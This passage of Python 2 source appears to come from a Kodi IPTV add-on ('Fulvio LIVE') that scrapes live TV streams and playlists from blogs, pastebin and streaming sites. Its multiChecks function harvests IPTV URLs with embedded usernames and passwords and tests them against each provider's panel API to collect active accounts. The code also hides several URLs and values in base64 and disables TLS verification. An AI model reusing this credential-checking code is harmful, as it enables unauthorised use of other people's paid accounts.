                        if i.has_key('fanart'):
                            fanart = i['fanart']
                        if i.has_key('description'):
                            desc = i['description']
                        if i.has_key('date'):
                            date = i['date']
                        if i.has_key('genre'):
                            genre = i['genre']
                        if i.has_key('credits'):
                            credits = i['credits']
                        addDir('[COLOR yellow]'+str(c)+'[/COLOR] | [COLOR orange]'+i['title']+'[/COLOR]',base64.b64decode(i['url']).encode('utf-8'),593,thumb,fanart,desc,genre,date,credits,'list3')
                    except: traceback.print_exc()

        addLink('','[B] [COLOR yellow] [/COLOR] [/B]','','','','','',True,None,'',10)

        if os.path.exists(source_list4)==True:
            sources = json.loads(open(source_list4,"r").read())
            #print 'sources',sources
            if len(sources) >= 1:
                c = 0
                for i in sources:
                    c += 1
                    try:
                        ## for pre 1.0.8 sources
                        if isinstance(i, list):
                            addDir(i[0].encode('utf-8'),base64.b64decode(i[1]).encode('utf-8'),1,icon,FANART,'','','','','list')
                        else:
                            thumb = icon
                            fanart = FANART
                            desc = ''
                            date = ''
                            credits = ''
                            genre = ''
                            if i.has_key('thumbnail'):
                                thumb = i['thumbnail']
                            if i.has_key('fanart'):
                                fanart = i['fanart']
                            if i.has_key('description'):
                                desc = i['description']
                            if i.has_key('date'):
                                date = i['date']
                            if i.has_key('genre'):
                                genre = i['genre']
                            if i.has_key('credits'):
                                credits = i['credits']
                            addDir('[COLOR yellow]'+str(c)+'[/COLOR] | [COLOR lightcyan]'+i['title']+'[/COLOR]',base64.b64decode(i['url']).encode('utf-8'),589,thumb,fanart,desc,genre,date,credits,'list4')
                    except: traceback.print_exc()

    except: traceback.print_exc()

def multiChecks(url=None,name=None,mlists=None):
    from xml.sax.saxutils import escape, unescape

    urls = []
    if isinstance(url, basestring):
        urls.append(url)
    else:
        urls = url

    out2 = set()
    numatt = 0
    for url in urls:

        match = set()
        if mlists:
            matches = mlists
        else:
            d = makeRequest(url)
            matches = re.findall(r'http://[^[/]+/get\.php\?username=[^&]+(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u', d)
        for m in matches:
            match.add(m)
        lists = match
        
        count = 0
        for list in lists:
            count += 1
        progress = xbmcgui.DialogProgress()
        progress.create('Progress', 'Ricerca in [COLOR hotpink]'+str(count)+'[/COLOR] liste in corso...   [COLOR yellow]'+str(numatt)+'[/COLOR] trovate [COLOR lime]Attive[/COLOR]')
        percent = 0
        int = 0
        cc = count
        for list in lists:
            try:
                int += 1
                percent = min((int*100)/count, 100)
                cc -= 1
                progress.update( percent, 'Ricerca in [COLOR hotpink]'+str(count)+'[/COLOR] liste in corso...   [COLOR yellow]'+str(numatt)+'[/COLOR] trovate [COLOR lime]Attive[/COLOR]', 'Rimanenti: [COLOR yellow]'+str(cc)+'[/COLOR] ', 'In corso: [COLOR lime]'+str(int)+' [/COLOR]' )
                ch = re.findall(r'http://(.+?)/get\.php\?username=([^&]+)(?:&|&amp;)password=([^&]+)(?:&|&amp;)type=m3u',list)
                for i1,i2,i3 in ch:
                    panel = 'http://'+i1+'/panel_api.php?username='+i2+'&password='+i3
                html = makeRequest2(panel)
                match = re.findall(r',"(status":".+?)","exp_date":["]*.+?["]*,"is_trial":".+?","active_cons":".+?","created_at":".+?","max_connections":".+?",', html)
                for n,i in enumerate(match):
                    if i == 'status":"Active':
                        out2.add(list)
                        numatt += 1
                if (progress.iscanceled()):
                    progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                    break
            except:
                pass
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        progress.close()

    import time
    now = str(time.time())
    folder = addon.getSetting("download_path_list") #os.path.join(xbmc.translatePath("special://home"),"liste")
    file = os.path.join(folder, 'lists-'+now+'.txt')
    f = open(file, 'w')
    for item in out2:
        f.write(""+str(item)+"\n")
    f.close()

    addLink('','$$multichecks$$ [B] [COLOR white] RISULTATI :  [/COLOR][/B]','','','','','',True,out2,None,1)
    addLink('','$$research$$','','','','','',True,out2,None,1)

    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for i in out2:
        list = re.finditer(r'http://(.{5}).+?/get\.php\?username=(.{1,3})[^&]+(?:&|&amp;)password=[^&]+(?:&|&amp;)type=m3u', i)
        c += 1
        for r in list:
            rr = unescape(r.group())
            r1 = r.group(1)
            r2 = r.group(2)
            n = '[B]   [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]LISTA[/COLOR] : [COLOR orange]'+r1+'[/COLOR] - [COLOR white]'+r2+'[/COLOR][/B]'
            addDir(n,rr,1,thumbnail,'','','','','','list')


def get_xml_database(url, browse=False):
        if url is None:
            url = 'http://xbmcplus.xb.funpic.de/www-data/filesystem/'
        soup = BeautifulSoup(makeRequest(url), convertEntities=BeautifulSoup.HTML_ENTITIES)
        for i in soup('a'):
            href = i['href']
            if not href.startswith('?'):
                name = i.string
                if name not in ['Parent Directory', 'recycle_bin/']:
                    if href.endswith('/'):
                        if browse:
                            addDir(name,url+href,15,icon,fanart,'','','')
                        else:
                            addDir(name,url+href,14,icon,fanart,'','','')
                    elif href.endswith('.xml'):
                        if browse:
                            addDir(name,url+href,1,icon,fanart,'','','','','download')
                        else:
                            if os.path.exists(source_list)==True:
                                if name in SOURCES:
                                    addDir(name+' (in use)',url+href,11,icon,fanart,'','','','','download')
                                else:
                                    addDir(name,url+href,11,icon,fanart,'','','','','download')
                            else:
                                addDir(name,url+href,11,icon,fanart,'','','','','download')

def getCommunitySources(browse=False):
        url = 'http://community-links.googlecode.com/svn/trunk/'
        soup = BeautifulSoup(makeRequest(url), convertEntities=BeautifulSoup.HTML_ENTITIES)
        files = soup('ul')[0]('li')[1:]
        for i in files:
            name = i('a')[0]['href']
            if browse:
                addDir(name,url+name,1,icon,fanart,'','','','','download')
            else:
                addDir(name,url+name,11,icon,fanart,'','','','','download')

def makeRequest(url, headers=None):
        try:
            if headers is None:
                if url.find(base64.decodestring('aXB0dnNoYXJlLnB3'))>0:
                    headers = {base64.decodestring('VXNlci1BZ2VudA==') : base64.decodestring('S0RnZVFkYU1Ucg==')}
                else:
                    headers = {base64.decodestring('VXNlci1BZ2VudA==') : base64.decodestring('TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMzLjAuMTc1MC4xNTQgU2FmYXJpLzUzNy4zNg==')}
                
            if '|' in url:
                url,header_in_page=url.split('|')
                header_in_page=header_in_page.split('&')
                
                for h in header_in_page:
                    if len(h.split('='))==2:
                        n,v=h.split('=')
                    else:
                        vals=h.split('=')
                        n=vals[0]
                        v='='.join(vals[1:])
                        #n,v=h.split('=')
                    print n,v
                    headers[n]=v
            if url.find(base64.decodestring('aXB0dnNoYXJlLnB3'))>0:
                content = requests.get(url, headers=headers, verify=False).text.encode("utf-8")
                data = gethome(content,getancor('name','path'))
            else:
                data = base64.urlsafe_b64decode(cachepage(url,86380))
            return data
        except urllib2.URLError, e:
            addon_log('URL: '+url)
            if hasattr(e, 'code'):
                addon_log('We failed with error code - %s.' % e.code)
                xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,We failed with error code - "+str(e.code)+",10000,"+icon+")")
            elif hasattr(e, 'reason'):
                addon_log('We failed to reach a server.')
                addon_log('Reason: %s' %e.reason)
                xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,We failed to reach a server. - "+str(e.reason)+",10000,"+icon+")")

def makeRequest2(url, headers=None):
        try:
            if headers is None:
                if url.find(base64.decodestring('aXB0dnNoYXJlLnB3'))>0:
                    headers = {base64.decodestring('VXNlci1BZ2VudA==') : base64.decodestring('S0RnZVFkYU1Ucg==')}
                else:
                    headers = {base64.decodestring('VXNlci1BZ2VudA==') : base64.decodestring('TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMzLjAuMTc1MC4xNTQgU2FmYXJpLzUzNy4zNg==')}
                
            if '|' in url:
                url,header_in_page=url.split('|')
                header_in_page=header_in_page.split('&')
                
                for h in header_in_page:
                    if len(h.split('='))==2:
                        n,v=h.split('=')
                    else:
                        vals=h.split('=')
                        n=vals[0]
                        v='='.join(vals[1:])
                        #n,v=h.split('=')
                    print n,v
                    headers[n]=v
            if url.find(base64.decodestring('aXB0dnNoYXJlLnB3'))>0:
                content = requests.get(url, headers=headers, verify=False).text.encode("utf-8")
                data = gethome(content,getancor('name','path'))
            else:
                data = cachepage2(url,86380)
            return data
        except urllib2.URLError, e:
            addon_log('URL: '+url)
            if hasattr(e, 'code'):
                addon_log('We failed with error code - %s.' % e.code)
                xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,We failed with error code - "+str(e.code)+",10000,"+icon+")")
            elif hasattr(e, 'reason'):
                addon_log('We failed to reach a server.')
                addon_log('Reason: %s' %e.reason)
                xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,We failed to reach a server. - "+str(e.reason)+",10000,"+icon+")")

def getSoup(url,data=None):
        global viewmode,tsdownloader, hlsretry
        tsdownloader=False
        hlsretry=False
        if url.startswith('http://') or url.startswith('https://'):
            enckey=False
            if '$$TSDOWNLOADER$$' in url:
                tsdownloader=True
                url=url.replace("$$TSDOWNLOADER$$","")
            if '$$HLSRETRY$$' in url:
                hlsretry=True
                url=url.replace("$$HLSRETRY$$","")
            if '$$Name=' in url:
                enckey=url.split('$$Name=')[1].split('$$')[0]
                rp='$$Name=%s$$'%enckey
                url=url.replace(rp,"")
                enckey=repest(enckey)
            if '$$LSProEncKey=' in url:
                enckey=url.split('$$LSProEncKey=')[1].split('$$')[0]
                rp='$$LSProEncKey=%s$$'%enckey
                url=url.replace(rp,"")
            if '$$Key$$' in url:
                enckey=Getkeyboardtext('Inserisci la KEY', '').strip()
                url=url.replace("$$Key$$","")
                
            data =makeRequest(url)
            if enckey:
                    import pyaes
                    enckey=enckey.encode("ascii")
                    print enckey
                    missingbytes=16-len(enckey)
                    enckey=enckey+(chr(0)*(missingbytes))
                    print repr(enckey)
                    data=base64.b64decode(data)
                    decryptor = pyaes.new(enckey , pyaes.MODE_ECB, IV=None)
                    data=decryptor.decrypt(data).split('\0')[0]
                    #print repr(data)
            if re.search("#EXTM3U",data) or 'm3u' in url:
#                print 'found m3u data'
                return data
        elif data == None:
            if not '/'  in url or not '\\' in url:
#                print 'No directory found. Lets make the url to cache dir'
                url = os.path.join(communityfiles,url)
            if xbmcvfs.exists(url):
                if url.startswith("smb://") or url.startswith("nfs://"):
                    copy = xbmcvfs.copy(url, os.path.join(profile, 'temp', 'sorce_temp.txt'))
                    if copy:
                        data = open(os.path.join(profile, 'temp', 'sorce_temp.txt'), "r").read()
                        xbmcvfs.delete(os.path.join(profile, 'temp', 'sorce_temp.txt'))
                    else:
                        addon_log("failed to copy from smb:")
                else:
                    data = open(url, 'r').read()
                    if re.match("#EXTM3U",data)or 'm3u' in url:
#                        print 'found m3u data'
                        return data
            else:
                addon_log("Soup Data not found!")
                return
        if '<SetViewMode>' in data:
            try:
                viewmode=re.findall('<SetViewMode>(.*?)<',data)[0]
                xbmc.executebuiltin("Container.SetViewMode(%s)"%viewmode)
                print 'done setview',viewmode
            except: pass
        return BeautifulSOAP(data, convertEntities=BeautifulStoneSoup.XML_ENTITIES)

def getData(url,fanart, data=None):
    import checkbad
    checkbad.do_block_check(False)
    soup = getSoup(url,data)
    #print type(soup)
    if isinstance(soup,BeautifulSOAP):
    #print 'xxxxxxxxxxsoup',soup
        if len(soup('channels')) > 0 and addon.getSetting('donotshowbychannels') == 'false':
            channels = soup('channel')
            for channel in channels:
#                print channel

                linkedUrl=''
                lcount=0
                try:
                    linkedUrl =  channel('externallink')[0].string
                    lcount=len(channel('externallink'))
                except: pass
                #print 'linkedUrl',linkedUrl,lcount
                if lcount>1: linkedUrl=''

                name = channel('name')[0].string
                if re.search(base64.decodestring('cGF5cGFs'), name):
                    name = base64.decodestring('W0JdICBbQ09MT1Igd2hpdGVdVW5pc2NpdGkgYWwgY2FuYWxlIGRpIHN1cHBvcnRvWy9DT0xPUl0gW0NPTE9SIGxpbWVdVGVsZWdyYW1bL0NPTE9SXSAgW0NPTE9SIGJsdWVdQGZ1bHZpb2xpdmVbL0NPTE9SXVsvQl0=')
                thumbnail = channel('thumbnail')[0].string
                if thumbnail == None:
                    thumbnail = ''
                thumbnail=processPyFunction(thumbnail)
                try:
                    if not channel('fanart'):
                        if addon.getSetting('use_thumb') == "true":
                            fanArt = thumbnail
                        else:
                            fanArt = fanart
                    else:
                        fanArt = channel('fanart')[0].string
                    if fanArt == None:
                        raise
                except:
                    fanArt = fanart

                try:
                    desc = channel('info')[0].string
                    if desc == None:
                        raise
                except:
                    desc = ''

                try:
                    genre = channel('genre')[0].string
                    if genre == None:
                        raise
                except:
                    genre = ''

                try:
                    date = channel('date')[0].string
                    if date == None:
                        raise
                except:
                    date = ''

                try:
                    credits = channel('credits')[0].string
                    if credits == None:
                        raise
                except:
                    credits = ''

                try:
                    if linkedUrl=='':
                        addDir(name.encode('utf-8', 'ignore'),url.encode('utf-8'),2,thumbnail,fanArt,desc,genre,date,credits,True)
                    else:
                        #print linkedUrl
                        addDir(name.encode('utf-8'),linkedUrl.encode('utf-8'),1,thumbnail,fanArt,desc,genre,date,None,True)
                except:
                    addon_log('There was a problem adding directory from getData(): '+name.encode('utf-8', 'ignore'))
        else:
            addon_log('No Channels: getItems')
            getItems(soup('item'),fanart)
    else:
        parse_m3u(soup)

def parse_m3u(data):
    content = data.rstrip()
    match = re.compile(r'#EXTINF:(.+?),(it[^a-zA-Z0-9].+?)[\n\r]+([^\r\n]+)', re.I).findall(content)
    total = len(match)
    print 'tsdownloader',tsdownloader
#    print 'total m3u links',total
    for other,channel_name,stream_url in match:
        contextMenu =[]
        if 'tvg-logo' in other:
            thumbnail = re_me(other,'tvg-logo=[\'"](.*?)[\'"]')
            if thumbnail:
                if thumbnail.startswith('http'):
                    thumbnail = thumbnail
                elif not addon.getSetting('logo-folderPath') == "":
                    logo_url = addon.getSetting('logo-folderPath')
                    thumbnail = logo_url + thumbnail
                else:
                    thumbnail = thumbnail
        else:
            thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
        if 'type' in other:
            mode_type = re_me(other,'type=[\'"](.*?)[\'"]')
            if mode_type == 'yt-dl':
                stream_url = stream_url +"&mode=18"
            elif mode_type == 'regex':
                url = stream_url.split('&regexs=')
                #print url[0] getSoup(url,data=None)
                regexs = parse_regex(getSoup('',data=url[1]))
                addLink(url[0], channel_name,thumbnail,'','','','','',None,regexs,total)
                continue
            elif mode_type == 'ftv':
                stream_url = 'plugin://plugin.video.F.T.V/?name='+urllib.quote(channel_name) +'&url=' +stream_url +'&mode=125&ch_fanart=na'
        addLink(stream_url, '[B][COLOR skyblue]'+channel_name+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)
    match = re.compile(r'#EXTINF:(.+?),((?!it[^a-zA-Z0-9]).+?)[\n\r]+([^\r\n]+)', re.I).findall(content)
    total = len(match)
    print 'tsdownloader',tsdownloader
#    print 'total m3u links',total
    for other,channel_name,stream_url in match:
        contextMenu =[]
        if 'tvg-logo' in other:
            thumbnail = re_me(other,'tvg-logo=[\'"](.*?)[\'"]')
            if thumbnail:
                if thumbnail.startswith('http'):
                    thumbnail = thumbnail
                elif not addon.getSetting('logo-folderPath') == "":
                    logo_url = addon.getSetting('logo-folderPath')
                    thumbnail = logo_url + thumbnail
                else:
                    thumbnail = thumbnail
        else:
            thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
        if 'type' in other:
            mode_type = re_me(other,'type=[\'"](.*?)[\'"]')
            if mode_type == 'yt-dl':
                stream_url = stream_url +"&mode=18"
            elif mode_type == 'regex':
                url = stream_url.split('&regexs=')
                #print url[0] getSoup(url,data=None)
                regexs = parse_regex(getSoup('',data=url[1]))
                addLink(url[0], channel_name,thumbnail,'','','','','',None,regexs,total)
                continue
            elif mode_type == 'ftv':
                stream_url = 'plugin://plugin.video.F.T.V/?name='+urllib.quote(channel_name) +'&url=' +stream_url +'&mode=125&ch_fanart=na'
        addLink(stream_url, '[B][COLOR skyblue]'+channel_name+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

def getWatchapp(s=None,url='http://tiny.cc/weutcy'):
    try:
        h = base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3BKd1luZExV')
        c = makeRequest(h)
        c = gethome(c,base64.decodestring('YlZjVTJQdmM2NHJZenpFZA=='))
        m = re.findall(base64.decodestring('PHBpbj4oLio/KTxwaW4+'), c)[0]
    except:
        pass

    if isinstance(s, basestring):
        if s == m:
            addDir('[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [COLOR yellow]   WATCHAPP by Fulvio[/COLOR][/B]','url',504,'','','','','','','list')
            html = makeRequest(url)
            match = re.findall(r'href=\'(http.*?:\/\/.+\/(.+?)\.m3u.*?)\'', html)
            c = 0
            for list, name in match:
                c += 1
                addDir('[B][COLOR white]•   [/COLOR][COLOR lime]LISTA:[/COLOR]     "[COLOR orange]'+str(c)+'[/COLOR]"  |  [COLOR white]'+name.encode('utf-8')+'[/COLOR][/B]',list.encode('utf-8'),1,'','','','','','','list')
        else:
            pass
    else:
        pass


def searchWatchapp(url='http://tiny.cc/weutcy'):
    keyboard = xbmc.Keyboard('', 'Fulvio LIVE')
    keyboard.doModal()
    text = keyboard.getText()
    if text == '':
        del text
    string = text.replace(' ','.{0,1}\s*')
    html = makeRequest(url)
    match = re.findall(r'href=\'(http.*?:\/\/.+\/(.+?)\.m3u.*?)\'', html)
    count = 0
    for item in match:
        count += 1
    c = str(count)
    # xbmcgui.Dialog().ok('Fulvio','Ci sono: '+c,'','')
    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Ricerca in [COLOR hotpink]'+c+'[/COLOR] liste in corso...')
    percent = 0
    i = 0
    cc = count
    matches = []
    for list, name in match:
        #print match.group(1)
        i += 1
        percent = min((i*100)/count, 100)
        cc -= 1
        ccc = str(cc)
        progress.update( percent, '', 'Liste rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'Lista in corso: [COLOR lime]'+str(i)+' - '+name+'[/COLOR]' )
        url1 = list
        try:
            html1 = makeRequest(url1)
            match1 = re.findall(r'#EXTINF:(.*?),(?i)(.*'+string+'.*)\s(http.*://(.{5}).*/live/(.{3}).*\.ts)', html1)
            matches += match1
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        except:
            pass
        if (progress.iscanceled()):
            progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
            break
    progress.close()
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(matches)
    c = 0
    for i1, name, url, i4, i5 in matches:
        c += 1
        addLink(url,'[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR]      [COLOR orange]'+i4+'[/COLOR] - [COLOR white]'+i5+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)

def getUrhd(url='http://urhd.tv'):
    # addDir('[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]FULL Cache - Experimental[/COLOR]  [COLOR white]< < <[/COLOR] [COLOR yellow]  URHD Live by Fulvio[/COLOR][/B]','http://urhd.tv',507,'','','','','','','list')
    # html = makeRequest(url)
    # match = re.findall(r'{&quot;alive&quot;:(true|false),&quot;display_name&quot;:&quot;(IT.+?)&quot;,&quot;picture&quot;:&quot;&quot;,&quot;slug&quot;:&quot;\\(.+?)&quot;}', html)
    # thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    # total = len(match)
    # c = 0
    # for check, name, url in match:
        # if check == 'true':
            # check = '[COLOR lime]ON[/COLOR]'
        # if check == 'false':
            # check = '[COLOR red]OFF[/COLOR]'
        # c += 1
        # addLink('http://urhd.tv'+url,'[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR]      '+check+'[/B]',thumbnail,'','','','',True,None,'',total)
    addDir('[B] [COLOR yellow]Home[/COLOR] [/B]','',505,'','','','','','','list')
    html = makeRequest(url)
    data = re.compile(r'<div class="Hot__player-channels">(.+?)<div class="Hot__player-embed">', re.DOTALL).findall(html)[0]
    players = re.compile(r'<div[^>]+data-slug="([^"]+)">([^<]+)<\/div>', re.DOTALL).findall(data)
    img = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    for u, n in players:
        n = n.replace('\n','')
        page = 'http://urhd.tv/'+u+'/embed'
        h = makeRequest(page)
        link = re.findall(r'file: \'(http[^\']+)\',', h)[0]
        c += 1
        addLink(link,'[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+n+'[/COLOR]  [/B]',img,'','','','',True,None,'',1)
    addDir(' ','',505,'','','','','','','list')
    addDir('[B] [COLOR yellow]ITALY[/COLOR] [/B]','',505,'','','','','','','list')
    pre = 'http://urhd.tv'
    html = makeRequest(pre+'/country/italy')
    match = re.compile(r'<div class="Channel__poster">\s*<a href="([^"]+)">\s*<img src="([^"]+)".+\s*.+\s*.+\s*<div class="card-footer" title="([^"]+)"').findall(html)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(match)
    c = 0
    for u, img, n in match:
        c += 1
        addLink(pre+u+'/embed','[B][COLOR lime]•[/COLOR] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+n+'[/COLOR]    [/B]',pre+img,'','','','',True,None,'',total)

def getUrhd2(url):
    html = makeRequest(url)
    link = re.findall("file:\s*'(http[^',]+)",html)[0]
    return link+'|User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&Referer='+url+'&Accept-Encoding=gzip, deflate&Connection=keep-alive'

def cacheUrhd(url='http://urhd.tv'):
    html = makeRequest(url)
    match = re.findall(r'{&quot;alive&quot;:(true|false),&quot;display_name&quot;:&quot;(IT.+?)&quot;,&quot;picture&quot;:&quot;&quot;,&quot;slug&quot;:&quot;\\(.+?)&quot;}', html)
    count = 0
    for item in match:
        count += 1
    c = str(count)
    # xbmcgui.Dialog().ok('Fulvio','Ci sono: '+c,'','')
    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Sto mettendo in cache le [COLOR hotpink]'+c+'[/COLOR] pagine...')
    percent = 0
    i = 0
    cc = count
    matches = []
    for check, name, url in match:
        i += 1
        percent = min((i*100)/count, 100)
        cc -= 1
        ccc = str(cc)
        progress.update( percent, '', 'Pagine rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'Pagina in corso: [COLOR lime]'+str(i)+' - '+name+'[/COLOR]' )
        url1 = 'http://urhd.tv'+url
        try:
            html1 = makeRequest(url1)
            match1 = re.findall(r'#EXTINF:(.*?),(?i)(.*'+string+'.*)\s(http.*://(.{5}).*/live/(.{3}).*\.ts)', html1)
            matches += match1
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        except:
            pass
        if (progress.iscanceled()):
            progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
            break
    progress.close()

def iptvSatindex():
    iptvSatmain('http://iptvsatlinks.blogspot.com/search?max-results=40')

def iptvSatmain(url):
    addDir('[B] [COLOR yellow]  IPTV SAT LINKS by Fulvio[/COLOR][/B]','url',509,'','','','','','','list')
    html = makeRequest(url)
    blogpage = re.compile("content='([^']+)' itemprop='image_url'.*?href='([^']+)'>([^<]+)<", re.DOTALL | re.IGNORECASE).findall(html)
    c = 0
    for img, url, name in blogpage:
        c += 1
        addDir('[B][COLOR white]'+str(c)+'[/COLOR] | [COLOR skyblue]'+name+'[/COLOR][/B]',url,511,img,'','','','','','list')
    try:
        nextp = re.compile("'blog-pager-older-link' href='([^']+)'", re.DOTALL | re.IGNORECASE).findall(html)[0]
        nextp = nextp.replace('&amp;','&')
        # addDir('Next Page', nextp, 0, uiptvicon)
        addDir('[B] [COLOR yellow]Next Page[/COLOR][/B]',nextp,510,'','','','','','','list')
    except: pass

def iptvSatpage(url):
    html = makeRequest(url)
    blogpage = re.compile('<div class="code">(.*?)</div>', re.DOTALL | re.IGNORECASE).findall(html)[0]
    if '#EXTINF' in blogpage:
        blogpage = blogpage.replace('<br />', '\n').replace('&nbsp;','').replace('&amp;','&')
        parse_m3u(blogpage)
    else:
        iptvlinks = re.compile("(h[^<]+)", re.DOTALL | re.IGNORECASE).findall(blogpage)
        i = 1
        for link in iptvlinks:
            link = link.replace('&amp;','&')
            matches = re.finditer(r'http://(.{6}).+?/get\.php\?username=(.{1,3}).+?&password=.+?&type=m3u', link)
            for match in matches:
                res1 = match.group(1)
                res2 = match.group(2)
            name = '[COLOR lime]LISTA[/COLOR] [COLOR yellow]' + str(i) + '[/COLOR] : [COLOR cyan]' + res1 + '[/COLOR] - [COLOR white]' + res2 + '[/COLOR]'
            # addDir(name, link, 2, uiptvicon)
            addDir('[B] [COLOR skyblue]'+name+'[/COLOR][/B]',link,512,'','','','','','','list')
            i = i + 1

def iptvSatiptv(url):
    try:
        m3u = makeRequest(url)
        parse_m3u(m3u)
    except:
        # addDir('Nothing found', '', '', '', Folder=False)
        addDir('[B] [COLOR white]Nothing found[/COLOR][/B]','url',509,'','','','','','','list')

def calcioStream():
    # links = [\
    # 'http://live.cc',\
    # ]
    u = base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2R1RVZWTmFt')
    h = makeRequest(u)
    links = re.findall(r'(http[^\'\s]+)', h)

    count = 0
    for item in links:
        count += 1
    c = str(count)
    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Ricerca in [COLOR hotpink]'+c+'[/COLOR] fonti in corso...')
    percent = 0
    i = 0
    cc = count
    matches = []
    for link in links:
        try:
            i += 1
            percent = min((i*100)/count, 100)
            cc -= 1
            ccc = str(cc)
            progress.update( percent, '', 'Rimanenti: [COLOR yellow]'+ccc+'[/COLOR] ', 'In corso: [COLOR lime]'+str(i)+' [/COLOR]' )
            r = requests.head(link, allow_redirects=True, timeout=10)
            url = r.url
            match = re.findall('(http:\/\/([^\/]+).+\/(.+\..+))',url)
            if not url.endswith('.jpg'):
                matches += match
            if (progress.iscanceled()):
                progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
                break
        except:
            pass
        if (progress.iscanceled()):
            progress.update( percent, 'Annullamento in corso...', 'Annullamento in corso...', 'Annullamento in corso...')
            break
    progress.close()
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    total = len(matches)
    c = 0
    for url, name1, name2 in matches:
        c += 1
        addLink(url,'[B] [COLOR yellow]'.encode('utf-8')+str(c)+'[/COLOR] | [COLOR skyblue]'+name1+'[/COLOR]    [COLOR orange]'+name2+'[/COLOR] [/B]',thumbnail,'','','','',True,None,'',total)

def sportcalcioPlaylist():
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    c = 0
    n = 0
    try:
        home = 'http://m.liveonlinetv247.info/skysportitalia.php'
        data = makeRequest(home)
        pages = re.findall(r'<li><a target="_top" href="([^"]+)">([^<]+)</a>', data)
        total = len(pages)
        for pageu, pagen in pages:
            h = '|User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&Referer='+pageu+'&Accept-Encoding=gzip, deflate&Connection=keep-alive'
            try:
                data1 = requests.get(pageu, headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36','Referer':home}, verify=False).text
                link = re.findall(r'<source src="([^"]+)"', data1)[0]
                c += 1
                addLink(link+h,'[B] [COLOR yellow]'+str(c)+'[/COLOR] | [COLOR skyblue]'+pagen+' [/COLOR] [/B]',thumbnail,'','','','',True,None,'',total)
            except:
                pass
    except:
        pass
    links = [\
    ['http://151.80.47.26:','Calcio']\
    ]
    total = len(links)
    p = 28031
    g = '/ipvt_001'
    h = '|User-Agent=VLC/2.2.2 LibVLC/2.2.17'
    for url, name in links:
        for i in range(8):
            c += 1
            p += 1
            n += 1
            addLink(url+str(p)+g+h,'[B] [COLOR yellow]'.encode('utf-8')+str(c)+'[/COLOR] | [COLOR skyblue]'+name+' '+str(n)+'[/COLOR] [/B]',thumbnail,'','','','',True,None,'',total)

def saferSurf():
    from operator import itemgetter
    url = 'http://safersurf.nutzwerk.de/php/livetv.php?id=1486996674136&browserLang=it&tr=0'
    headers = {\
    'Host':'safersurf.nutzwerk.de',\
    'Connection':'keep-alive',\
    'Accept':'text/html, */*; q=0.01',\
    'X-Requested-With':'XMLHttpRequest',\
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',\
    'Referer':'http://safersurf.nutzwerk.de/champions-league-proxy-livedemo.html',\
    'Accept-Encoding':'gzip, deflate, sdch',\
